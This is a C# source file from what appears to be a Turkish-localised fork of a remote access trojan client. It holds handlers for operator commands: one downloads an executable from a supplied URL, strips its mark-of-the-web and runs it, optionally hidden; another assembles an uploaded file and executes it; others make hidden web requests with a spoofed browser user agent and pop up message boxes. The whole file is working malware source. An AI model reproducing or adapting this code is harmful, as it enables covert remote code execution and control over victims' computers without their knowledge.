using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using xClient.KuuhakuÇekirdek.Yardımcılar;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Utilityler;

namespace xClient.KuuhakuÇekirdek.Eylemler
{
    public static partial class Eylemİşleyicisi
    {
        public static void HandleDoDownloadAndExecute(Paketler.ServerPaketleri.DoDownloadAndExecute command,
            Client client)
        {
            new Paketler.ClientPaketleri.SetStatus("Dosya İndiriliyor...").Execute(client);

            new Thread(() =>
            {
                string tempFile = DosyaYardımcısı.TempDosyaDizininiAl(".exe");

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.URL, tempFile);
                    }
                }
                catch
                {
                    new Paketler.ClientPaketleri.SetStatus("İndirme Başarısız").Execute(client);
                    return;
                }

                new Paketler.ClientPaketleri.SetStatus("Dosya İndirildi!").Execute(client);

                try
                {
                    DosyaYardımcısı.DeleteZoneIdentifier(tempFile);

                    var bytes = File.ReadAllBytes(tempFile);
                    if (!DosyaYardımcısı.ExeValidmiKardeş(bytes))
                        throw new Exception("herhangi bir pe dosyası bulunamadı.");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = false;
                    startInfo.FileName = tempFile;
                    Process.Start(startInfo);
                }
                catch
                {
                    NativeMethods.DeleteFile(tempFile);
                    new Paketler.ClientPaketleri.SetStatus("Yürütme Başarısız!").Execute(client);
                    return;
                }

                new Paketler.ClientPaketleri.SetStatus("Dosya Yürütüldü!").Execute(client);
            }).Start();
        }

        public static void HandleDoUploadAndExecute(Paketler.ServerPaketleri.DoUploadAndExecute command, Client client)
        {
            if (!_renamedFiles.ContainsKey(command.ID))
                _renamedFiles.Add(command.ID, DosyaYardımcısı.TempDosyaDizininiAl(Path.GetExtension(command.FileName)));

            string filePath = _renamedFiles[command.ID];

            try
            {
                if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !DosyaYardımcısı.ExeValidmiKardeş(command.Block))
                    throw new Exception("Exe dosyası bulunamadı.");

                FileSplit destFile = new FileSplit(filePath);

                if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                    throw new Exception(destFile.LastError);

                if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                {
                    if (_renamedFiles.ContainsKey(command.ID))
                        _renamedFiles.Remove(command.ID);

                    DosyaYardımcısı.DeleteZoneIdentifier(filePath);

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = false;
                    startInfo.FileName = filePath;
                    Process.Start(startInfo);

                    new Paketler.ClientPaketleri.SetStatus("Dosya Yürütüldü!").Execute(client);
                }
            }
            catch (Exception ex)
            {
                if (_renamedFiles.ContainsKey(command.ID))
                    _renamedFiles.Remove(command.ID);
                NativeMethods.DeleteFile(filePath);
                new Paketler.ClientPaketleri.SetStatus(string.Format("Yürütme Başarısız: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleDoVisitWebsite(Paketler.ServerPaketleri.DoVisitWebsite command, Client client)
        {
            string url = command.URL;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!command.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        {
                        }
                    }
                    catch
                    {
                    }
                }

                new Paketler.ClientPaketleri.SetStatus("Websitesi Ziyaret Edildi.").Execute(client);
            }
        }

        public static void HandleDoShowMessageBox(Paketler.ServerPaketleri.DoShowMessageBox command, Client client)
        {
            new Thread(() =>
            {
                MessageBox.Show(command.Text, command.Caption,
                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton),
                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon),
                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
            }).Start();

            new Paketler.ClientPaketleri.SetStatus("Mesaj Kutusu Gösterildi.").Execute(client);
        }
    }
}